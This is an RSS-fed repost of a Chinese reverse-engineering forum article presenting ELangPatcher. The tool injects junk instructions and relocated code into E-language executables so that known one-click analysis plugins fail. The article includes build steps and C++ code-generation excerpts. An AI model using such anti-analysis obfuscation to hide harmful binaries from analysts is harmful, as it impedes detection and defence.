<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0" xmlns:dc="http://purl.org/dc/elements/1.1/" xmlns:content="http://purl.org/rss/1.0/modules/content/" xmlns:atom="http://www.w3.org/2005/Atom">
<channel>
<title>吾爱破解论坛</title>
<link>https://wechat2rss.xlab.app/https://wechat2rss.xlab.app/feed/90c827b8290310a96ef80a13df9dbcc06ab69892.xml</link>

<item>
<title>ELangPatcher - 一个简单的基于特征码的易语言静态编译程序膨胀与混淆工具</title>
<link>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140425&amp;idx=1&amp;sn=30beed51ba6fe1d836f264e0d07905b4&amp;chksm=bd50a11d8a27280b4675e00e503dfdaf9dae053b111d43a3b753a833ee548f4c0f94b0421565&amp;scene=58&amp;subscene=0</link>
<guid>https://mp.weixin.qq.com/s?__biz=MjM5Mjc3MDM2Mw==&amp;mid=2651140425&amp;idx=1&amp;sn=30beed51ba6fe1d836f264e0d07905b4&amp;chksm=bd50a11d8a27280b4675e00e503dfdaf9dae053b111d43a3b753a833ee548f4c0f94b0421565&amp;scene=58&amp;subscene=0</guid>
<content:encoded><![CDATA[

<p>
原创 <span>吾爱pojie</span> <span>2024-03-28 14:43</span> <span style="display: inline-block;">北京</span>
</p>

<p>针对易语言静态编译的代码进行轻微混淆处理，避免被插件一键识别部分关键函数。处理过的内容参考下方。注意该轻微膨胀/混淆只能用来对抗现有的“一键识别”工具，不能和加密壳的效果比。如果你能拿到这类工具的源码缝缝补补，应该也能让它重新识别。</p>


<p style="margin-bottom: 0px; letter-spacing: 0.578px; text-align: center; margin-left: 8px; margin-right: 8px;">
<img src="https://https://wechat2rss.xlab.app/img-proxy/?k=4e9e8aa3&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_jpg%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW9OHegzK2VddU28NZObhpLCYVNJsibcw3FhNrDnpKUhsYWj4cuOdJ7btQ%2F0%3Fwx_fmt%3Djpeg" />
</p>

<p style="margin-bottom: 0px; line-height: normal;"><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>作者</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>论</span></strong><strong style="letter-spacing: 0.544px; background-color: rgb(255, 255, 255); text-align: start; font-size: 20px;"><span>坛账号：爱飞的猫</span></strong></p><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p>针对易语言静态编译的代码进行轻微混淆处理，避免被插件一键识别部分关键函数。处理过的内容参考下方。</p><p>注意该轻微膨胀/混淆只能用来对抗现有的“一键识别”工具，不能和加密壳的效果比。</p><p>如果你能拿到这类工具的源码缝缝补补，应该也能让它重新识别。</p><p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=37b84b5a&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_png%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW9ia0secmnZS1pN1mibm70ySRRvn8SNSyBygGVmxewaU5CZiaGic4ENO71Kw%2F640%3Fwx_fmt%3Dpng%26from%3Dappmsg" style="cursor: pointer; border-width: 0px; border-color: initial; vertical-align: middle; width: auto;" /></p><h2>原理</h2><p>对已知的部分特征进行魔改，大部分时候都是对简单操作进行膨胀，然后开辟新的内存空间跳转过去。</p><p>因为生成代码计算绝对地址比较麻烦，所以依赖 CALL 指令自动入栈的返回地址来计算正确跳转位置。</p><h2>处理过的特征</h2><p>只处理了一小部分特征。手动整起来太麻烦了，感觉不如利用特征码自动标记然后上加密壳批量处理了。</p><ul><li style="margin-left: 2px;"><p>对抗 查找易语言按钮事件 插件</p></li><li style="margin-left: 2px;"><p>对抗 EWnd v0.2 插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 EWnd Ultimate 插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 E-Debug 程序/插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 E-Decompiler 插件的一键分析</p></li><li style="margin-left: 2px;"><p>对抗 易语言逆向分析助手 的窗体信息分析</p></li><li style="margin-left: 2px;"><p>对抗易语言初始化入口识别（<code style="font-family: SFMono-Regular, Consolas, ;">cld; fninit; call xxxx</code>）</p></li><li style="margin-left: 2px;"><p>对抗控件处理事件识别（重写了个简单的，混淆程度不高 <code style="font-family: SFMono-Regular, Consolas, ;">call dword[ebp - 4]</code>）</p></li><li style="margin-left: 2px;"><p>处理了找到的一些乱七八糟的特征…</p></li></ul><h2>从源码构建</h2><p>首先确保安装有 VS 2022、CMake、Git for Windows 这三个程序。CMake 安装时需要选择将 <code style="font-family: SFMono-Regular, Consolas, ;">cmake.exe</code> 注册到系统。</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">:: 克隆仓库<br />git clone https://github.com/FlyingRainyCats/ELangPatcher.git<br />cd ELangPatcher<br /><br />:: 更新子模组<br />git submodule update --init --recursive<br /><br />:: 开始构建<br />cmake -Bcmake-build-vs2022 -G <span style="color: rgb(168, 255, 96);">"Visual Studio 17 2022"</span> -A Win32<br />cmake --build cmake-build-vs2022 --config Release</code></pre><h2>使用方法</h2><p>将可执行文件拖放到 <code style="font-family: SFMono-Regular, Consolas, ;">ELangPatcher.exe</code> 即可处理。</p><p>可以指定额外参数：</p><ul><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">--suffix _p</code> 指定新的后缀，写出到新的文件。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-b, --backup</code> 是否备份原始文件，默认启用。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">--fake-stub</code> 插入假的特征码内容到文件，默认启用。</p></li><li style="margin-left: 2px;"><p><code style="font-family: SFMono-Regular, Consolas, ;">-h, --help</code> 查看帮助信息</p></li></ul><p>示例输出：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">* (<span style="color: rgb(255, 115, 253);">2</span>). <span style="color: rgb(168, 255, 96);">"M:\Programs\E_5.1\tools\ELangPatcher.exe"</span> --suffix _ -- <span style="color: rgb(168, 255, 96);">"M:\Projects\e-AntiWnd\测试3_5.1_静态编译.exe"</span><br />ELang Patcher v0<span style="color: rgb(255, 115, 253);">.1</span> by FlyingRainyCats (爱飞的猫 @52pojie<span style="color: rgb(255, 115, 253);">.</span>cn)<br /><span style="color: rgb(198, 197, 254);">INFO:</span> processing: M:\Projects\e-AntiWnd\测试<span style="color: rgb(255, 115, 253);">3_5.1_</span>静态编译.exe<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchDllFunctionInvokeCall] found (offset=<span style="color: rgb(255, 115, 253);">0x0001ac80</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffffffda</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchEWndV02] found (offset=<span style="color: rgb(255, 115, 253);">0x00013a40</span>, ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffffc787</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchEWndUltimate] found (offset=<span style="color: rgb(255, 115, 253);">0x00038adf</span>, data=<span style="color: rgb(255, 115, 253);">0x004816a0</span>, wnd_data_offset=<span style="color: rgb(255, 115, 253);">0x000816a0</span>)<br />    - stub added: <span style="color: rgb(255, 115, 253);">0x0048074d</span> (file offset: <span style="color: rgb(255, 115, 253);">0008074d</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchWndEventHandlerMain] found (fn_end=0001adb6, offset=<span style="color: rgb(255, 115, 253);">0x0001ad10</span>, inst=<span style="color: rgb(255, 115, 253);">0x0001ad3a</span>(p: <span style="color: rgb(255, 115, 253);">0x0041ad3a</span>), delta=<span style="color: rgb(255, 115, 253);">0xffff9ab1</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchKernelInvokeCall#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001ac90</span>, len=003b, replace_len=002c)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchKernelInvokeCall#<span style="color: rgb(255, 115, 253);">1</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001acd0</span>, len=<span style="color: rgb(255, 115, 253);">0031</span>, replace_len=<span style="color: rgb(255, 115, 253);">0025</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [ELibInvokeCall#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001ac60</span>, args=[<span style="color: rgb(255, 115, 253);">1</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff7dbf</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [ELibInvokeCall#<span style="color: rgb(255, 115, 253);">1</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001b0a0</span>, args=[<span style="color: rgb(255, 115, 253);">1</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff718f</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [LoadInitWindow#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001b020</span>, args=[<span style="color: rgb(255, 115, 253);">4</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff8b33</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [UnknownCtrlRelated#<span style="color: rgb(255, 115, 253);">0</span>] found (offset=<span style="color: rgb(255, 115, 253);">0x0001b040</span>, args=[<span style="color: rgb(255, 115, 253);">6</span>], ecx=<span style="color: rgb(255, 115, 253);">0x004b3658</span>, call_delta=<span style="color: rgb(255, 115, 253);">0xffff9a4b</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchLoadWndCall] found (offset=<span style="color: rgb(255, 115, 253);">0x000015cb</span>, ebx=<span style="color: rgb(255, 115, 253);">0x004017e0</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x0000012a</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchLoadWndCall] found (offset=<span style="color: rgb(255, 115, 253);">0x00001007</span>, ebx=<span style="color: rgb(255, 115, 253);">0x004017e0</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000006f7</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchLoadWndCall] found (offset=<span style="color: rgb(255, 115, 253);">0x000016aa</span>, ebx=<span style="color: rgb(255, 115, 253);">0x004017e0</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000054</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x000012f1</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000457</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x000013a1</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000003a7</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001449</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000002ed</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x000014d9</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x0000025d</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001584</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000001b2</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001626</span>, push_value=<span style="color: rgb(255, 115, 253);">0x00000006</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000110</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001686</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x000000aa</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchSuspiciousCallWithParam] found (offset=<span style="color: rgb(255, 115, 253);">0x00001707</span>, push_value=<span style="color: rgb(255, 115, 253);">0x52010048</span>, call_delta=<span style="color: rgb(255, 115, 253);">0x00000011</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [PatchELangLoaderInitStub] found (offset=<span style="color: rgb(255, 115, 253);">0x000016ed</span>)<br /><span style="color: rgb(198, 197, 254);">  INFO:</span> [MiscAddFakeEWndStub] <span style="color: rgb(150, 203, 254);">add</span> stub (len=<span style="color: rgb(255, 115, 253);">140</span> bytes)</code></pre><h3>集成到易语言</h3><ol><li style="margin-left: 2px;"><p>打开易语言目录；</p></li><li style="margin-left: 2px;"><p>打开该目录下的 <code style="font-family: SFMono-Regular, Consolas, ;">tools</code> 目录；</p></li><li style="margin-left: 2px;"><p>将 <code style="font-family: SFMono-Regular, Consolas, ;">ELangPatcher.exe</code> 放入该目录；</p></li><li style="margin-left: 2px;"><p>打开 <code style="font-family: SFMono-Regular, Consolas, ;">link.ini</code> 配置文件；</p></li><li style="margin-left: 2px;"><p>找到结尾的 <code style="font-family: SFMono-Regular, Consolas, ;">post_link_action</code> 区域，并添加新的操作。</p></li><ol class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>静态编译后自动处理，参考添加 <code style="font-family: SFMono-Regular, Consolas, ;">post_link_action1="$(E_TOOLS)\ELangPatcher.exe" $(TARGET)</code>；</p></li><li style="margin-left: 2px;"><p>如果有自动加壳，你需要调整序号，让 <code style="font-family: SFMono-Regular, Consolas, ;">ELangPatcher.exe</code> 先执行；</p></li></ol></ol><h2>部分代码展示</h2><p>混淆 cld/fninit 特征 (<code style="font-family: SFMono-Regular, Consolas, ;">LibELangPatch/ELangInitFnGen.cpp</code>)：</p><p>本质上就是抽取 <code style="font-family: SFMono-Regular, Consolas, ;">cld; fninit; call xxxx</code> 这串代码到别的地方，并插入随机垃圾代码避免现有特征码定位：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;"><span style="color: rgb(124, 124, 124);">/**<br /> * 0040116D | FC          | cld             &lt;-- addr start<br /> * 0040116E | DBE3        | fninit<br /> * 00401170 | E8 ECFFFFFF | call exe.401161 &lt;-- call_delta = 0x0xFFFFFFEC<br /> * @param call_delta This can be `{}` if the call is empty.<br /> * @return<br /> */</span><br />std::vector&lt;<span style="color: rgb(255, 255, 182);">uint8_t</span>&gt; <span style="color: rgb(255, 255, 182);">GenerateELangLoaderInit</span>(std::optional&lt;<span style="color: rgb(255, 255, 182);">uint32_t</span>&gt; call_delta);<br /><br /><span style="color: rgb(150, 203, 254);">class</span> <span style="color: rgb(255, 255, 182);">ELangLoaderInitGen</span> : <span style="color: rgb(150, 203, 254);">public</span> CodeGenHelper {<br /><span style="color: rgb(150, 203, 254);">public</span>:<br />    <span style="color: rgb(150, 203, 254);">explicit</span> <span style="color: rgb(255, 255, 182);">ELangLoaderInitGen</span>(std::optional&lt;<span style="color: rgb(255, 255, 182);">uint32_t</span>&gt; call_delta) {<br />        <span style="color: rgb(150, 203, 254);">auto</span> regs = shuffled&lt;Reg32&gt;({eax, edx, ecx});<br />        fillWithJunkSlideInst(rand_int(<span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">5</span>), regs);<br />        shuffle_exec({<br />                [&amp;]() { cld(); genJunk(regs); },<br />                [&amp;]() { fninit(); genJunk(regs); },<br />        });<br />        fillWithJunkSlideInst(rand_int(<span style="color: rgb(255, 115, 253);">1</span>, <span style="color: rgb(255, 115, 253);">5</span>), regs);<br /><br />        <span style="color: rgb(255, 255, 182);">bool</span> use_ret_trick{<span style="color: rgb(198, 197, 254);">false</span>};<br />        <span style="color: rgb(150, 203, 254);">if</span> (call_delta) {<br />            use_ret_trick = next_bool();<br />            <span style="color: rgb(150, 203, 254);">auto</span> reg_ret_addr = pop_last_item(regs);<br />            mov(reg_ret_addr, dword[esp]);<br />            genJunk(regs);<br />            <span style="color: rgb(150, 203, 254);">if</span> (use_ret_trick) {<br />                add(dword[esp], <span style="color: rgb(255, 115, 253);">3</span>);<br />                genJunk(regs);<br />            }<br />            <span style="color: rgb(150, 203, 254);">auto</span> delta_signed = static_cast&lt;<span style="color: rgb(255, 255, 182);">int32_t</span>&gt;(*call_delta);<br />            <span style="color: rgb(150, 203, 254);">if</span> (delta_signed &gt; <span style="color: rgb(255, 115, 253);">0</span>) {<br />                add(reg_ret_addr, delta_signed);<br />            } <span style="color: rgb(150, 203, 254);">else</span> {<br />                sub(reg_ret_addr, -delta_signed);<br />            }<br />            genJunk(regs);<br /><br />            <span style="color: rgb(150, 203, 254);">if</span> (use_ret_trick) {<br />                jmp(reg_ret_addr);<br />            } <span style="color: rgb(150, 203, 254);">else</span> {<br />                call(reg_ret_addr);<br />            }<br />        }<br /><br />        regs = shuffled&lt;Reg32&gt;({eax, edx, ecx});<br />        <span style="color: rgb(150, 203, 254);">if</span> (!use_ret_trick) {<br />            genJunk(regs);<br />            add(dword[esp], <span style="color: rgb(255, 115, 253);">3</span>);<br />        }<br />        genJunk(regs);<br />        ret();<br /><br />        std::vector&lt;<span style="color: rgb(255, 255, 182);">uint8_t</span>&gt; <span style="color: rgb(255, 255, 182);">junk</span>(rand_int(<span style="color: rgb(255, 115, 253);">4</span>, <span style="color: rgb(255, 115, 253);">10</span>));<br />        std::generate(junk.begin(), junk.end(), mt_);<br />        db(junk.data(), junk.size());<br />    }<br />};<br /><br />std::vector&lt;<span style="color: rgb(255, 255, 182);">uint8_t</span>&gt; <span style="color: rgb(255, 255, 182);">GenerateELangLoaderInit</span>(std::optional&lt;<span style="color: rgb(255, 255, 182);">uint32_t</span>&gt; call_delta) {<br />    <span style="color: rgb(150, 203, 254);">return</span> ELangLoaderInitGen{call_delta}.vec();<br />}</code></pre><p>扩充 <code style="font-family: SFMono-Regular, Consolas, ;">.text</code> 段，若无剩余空间则建立新的 <code style="font-family: SFMono-Regular, Consolas, ;">.txt2</code> 段储存代码 (<code style="font-family: SFMono-Regular, Consolas, ;">src/PEParser.h</code>)：</p><pre style="background-color: rgb(246, 248, 250); border-radius: 6px; padding: 4px; margin-bottom: 15px; overflow: auto; line-height: 1.45; color: rgb(68, 68, 68); font-size: 14px; letter-spacing: normal; text-align: start; border-style: none !important; border-color: initial !important;"><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 复制代码</em><em style="cursor: pointer; font-size: 12px; color: rgb(51, 102, 153) !important;"> 隐藏代码<br /></em><code style="font-family: SFMono-Regular, Consolas, ;">            inline uint8_t *<span style="color: rgb(255, 255, 182);">ExpandTextSection</span>(uint32_t size) {<br />                auto p_nt_header = <span style="color: rgb(255, 255, 182);">INNER_PIMAGE_NT_HEADERS</span>((uint8_t *) (exe_data_.<span style="color: rgb(255, 255, 182);">data</span>()) + <span style="color: rgb(255, 255, 182);">PIMAGE_DOS_HEADER</span>(exe_data_.<span style="color: rgb(255, 255, 182);">data</span>())-&gt;e_lfanew);<br />                auto p_file_header = &amp;p_nt_header-&gt;FileHeader;<br />                auto section_count = std::<span style="color: rgb(255, 255, 182);">size_t</span>(p_file_header-&gt;NumberOfSections);<br /><br />                auto section = (PIMAGE_SECTION_HEADER) ((uint8_t *) (p_nt_header) + <span style="color: rgb(255, 255, 182);">offsetof</span>(INNER_IMAGE_NT_HEADERS, OptionalHeader) + p_nt_header-&gt;FileHeader.SizeOfOptionalHeader);<br /><br />                auto &amp;image_size = <span style="color: rgb(255, 255, 182);">GetNtOptionalHeader</span>()-&gt;SizeOfImage;<br /><br />                <span style="color: rgb(255, 255, 182);">for</span> (std::size_t i = <span style="color: rgb(255, 115, 253);">0</span>; i &lt; section_count; i++) {<br />                    <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>((<span style="color: rgb(255, 255, 182);">char</span> *) section-&gt;Name, <span style="color: rgb(168, 255, 96);">".text"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />                        <span style="color: rgb(255, 255, 182);">if</span> (section-&gt;Misc.VirtualSize + size &lt; section-&gt;SizeOfRawData) {<br />                            auto offset = section-&gt;Misc.VirtualSize;<br />                            section-&gt;Misc.VirtualSize += size;<br />                            <span style="color: rgb(150, 203, 254);">return</span> &amp;exe_data_.<span style="color: rgb(255, 255, 182);">at</span>(section-&gt;PointerToRawData + offset);<br />                        }<br />                    } <span style="color: rgb(150, 203, 254);">else</span> <span style="color: rgb(255, 255, 182);">if</span> (<span style="color: rgb(255, 255, 182);">strcmp</span>((<span style="color: rgb(255, 255, 182);">char</span> *) section-&gt;Name, <span style="color: rgb(168, 255, 96);">".txt2"</span>) == <span style="color: rgb(255, 115, 253);">0</span>) {<br />                        exe_data_.<span style="color: rgb(255, 255, 182);">resize</span>(exe_data_.<span style="color: rgb(255, 255, 182);">size</span>() + size);<br />                        auto offset = section-&gt;SizeOfRawData;<br />                        section-&gt;SizeOfRawData += size;<br />                        image_size -= section-&gt;Misc.VirtualSize;<br />                        section-&gt;Misc.VirtualSize = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(section-&gt;SizeOfRawData);<br />                        image_size += section-&gt;Misc.VirtualSize;<br />                        <span style="color: rgb(150, 203, 254);">return</span> &amp;exe_data_.<span style="color: rgb(255, 255, 182);">at</span>(section-&gt;PointerToRawData + offset);<br />                    }<br />                    section++;<br />                }<br /><br />                auto last_section = §ion[-<span style="color: rgb(255, 115, 253);">1</span>];<br />                p_file_header-&gt;NumberOfSections++;<br /><br />                <span style="color: rgb(255, 255, 182);">memset</span>(section, <span style="color: rgb(255, 115, 253);">0</span>, <span style="color: rgb(255, 255, 182);">sizeof</span>(*section));<br />                <span style="color: rgb(255, 255, 182);">memcpy</span>(section-&gt;Name, <span style="color: rgb(168, 255, 96);">".txt2"</span>, <span style="color: rgb(255, 115, 253);">6</span>);<br />                section-&gt;PointerToRawData = exe_data_.<span style="color: rgb(255, 255, 182);">size</span>();<br />                section-&gt;SizeOfRawData = size;<br />                section-&gt;Misc.VirtualSize = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(size);<br />                image_size = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(image_size) + section-&gt;Misc.VirtualSize;<br />                section-&gt;VirtualAddress = helper::<span style="color: rgb(255, 255, 182);">round_up_to_section_size</span>(last_section-&gt;VirtualAddress + last_section-&gt;Misc.VirtualSize);<br />                section-&gt;Characteristics = IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ | IMAGE_SCN_CNT_CODE;<br />                exe_data_.<span style="color: rgb(255, 255, 182);">resize</span>(exe_data_.<span style="color: rgb(255, 255, 182);">size</span>() + size);<br /><br />                <span style="color: rgb(150, 203, 254);">return</span> &amp;exe_data_.<span style="color: rgb(255, 255, 182);">at</span>(exe_data_.<span style="color: rgb(255, 255, 182);">size</span>() - size);<br />            }</code></pre><hr /><h2>下载</h2><ul><li style="margin-left: 2px;"><p>程序： </p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=7bf08160&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW96FTJVfEQytoddBVaVbzrl23kGlcyy31b7ibrC84S1aChQuZ3PNLOt1A%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="vertical-align: middle; cursor: pointer; border-width: 0px; border-color: initial; width: auto;" /> <span>ELangPatcher-0.1.1.zip 见左下角论坛原文</span></li><li style="margin-left: 2px;"><p>源码：https://github.com/FlyingRainyCats/ELangPatcher | </p><img border="0" src="https://https://wechat2rss.xlab.app/img-proxy/?k=7bf08160&amp;u=https%3A%2F%2Fmmbiz.qpic.cn%2Fsz_mmbiz_gif%2FLFPriaSjBUZITMfibuWHtnWkhPvR40jXW96FTJVfEQytoddBVaVbzrl23kGlcyy31b7ibrC84S1aChQuZ3PNLOt1A%2F640%3Fwx_fmt%3Dgif%26from%3Dappmsg" style="vertical-align: middle; cursor: pointer; border-width: 0px; border-color: initial; width: auto;" /> <span>ELangPatcher-0.1.1-src.zip <span>见左下角论坛原文</span></span></li><li style="margin-left: 2px;"><p>百度网盘存档/测试程序 https://pan.baidu.com/s/1Jlbqt8K1fIG6PPbfrrEI_A?pwd=q565</p></li></ul><h3>更新记录</h3><ul><li style="margin-left: 2px;"><p>v0.1.1: 修正 <code style="font-family: SFMono-Regular, Consolas, ;">GenerateVArgsProxyCode</code> 的代码生成（如 <code style="font-family: SFMono-Regular, Consolas, ;">取余数</code> 传参），感谢 <code style="font-family: SFMono-Regular, Consolas, ;">谁的坏叔叔</code> 报告。</p></li><li style="margin-left: 2px;"><p>v0.1: 初版发布</p></li></ul><h2>结语</h2><p>代码写得比较乱，大概率不会有后续更新了…</p><p>拿 <code style="font-family: SFMono-Regular, Consolas, ;">Xbyak</code> 生成字节码，调试错误的时候也是磕磕碰碰。因为都是手动插入的垃圾指令，早期写得那些代码生成的混淆“相对温和”。后期整得有点走火入魔，也尝试了下隐藏常数。</p><p>一开始就想着对抗下 “一键 PUSH”，这个目的倒是达到了。不过其它的特征… 手动根本就处理不完。</p><p>在 <code style="font-family: SFMono-Regular, Consolas, ;">.text</code> 外的内容如果有匹配上特征码也会尝试进行魔改。读者有兴趣可以限制特征码检索为 <code style="font-family: SFMono-Regular, Consolas, ;">.text</code> 区段的代码。</p><p>不过，这些混淆/膨胀的手段在 IDA 的帮助下分析起来倒是不怎么费劲就是…</p><h3>碎碎念</h3><ul><li style="margin-left: 2px;"><p>易语言的编译顺序太“稳定”了，可以通过定位目标函数附近的函数来快速定位。</p></li><li style="margin-left: 2px;"><p>没处理过特征的函数依然可以手动检索特征码找到。</p></li><li style="margin-left: 2px;"><p>再做下去感觉需要自动化识别函数、反编译、然后随机混淆/膨胀了。</p></li><ul class="list-paddingleft-1" style="margin-bottom: 15px; padding-left: 2em;"><li style="margin-left: 2px;"><p>要考虑的东西太多了，不适合我。</p></li></ul></ul><h2>致谢</h2><ul><li style="margin-left: 2px;"><p>fjqisba 老师的易语言逆向专栏</p></li><li style="margin-left: 2px;"><p>易语言程序分析笔记 - 看雪/PlaneJun</p></li></ul><p style="margin-bottom: 0px; line-height: normal;"><br /></p><p style="margin-bottom: 0px; letter-spacing: 0.544px; color: rgb(53, 53, 53); text-align: start; background-color: rgb(255, 255, 255); line-height: 25.6px; font-family: Tahoma, Helvetica, SimSun, sans-serif;"><strong><span style="color: rgb(0, 176, 80);"><strong><span style="color: rgb(255, 255, 255); background-color: rgb(0, 176, 80);">-官方论坛</span></strong></span></strong><br /></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span>www.52pojie.cn</span></p><p style="margin-top: 8px; margin-bottom: 0px; letter-spacing: 0.544px; text-align: start; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span><br /></span></p><p></p><br /><p style="margin-bottom: 0px; letter-spacing: 0.544px; text-indent: 0em; text-align: center; background-color: rgb(255, 255, 255); color: rgb(53, 53, 53); font-size: 14px; font-family: Tahoma, Helvetica, SimSun, sans-serif; line-height: normal;"><span style="background-color: rgb(255, 251, 0); letter-spacing: normal; font-size: 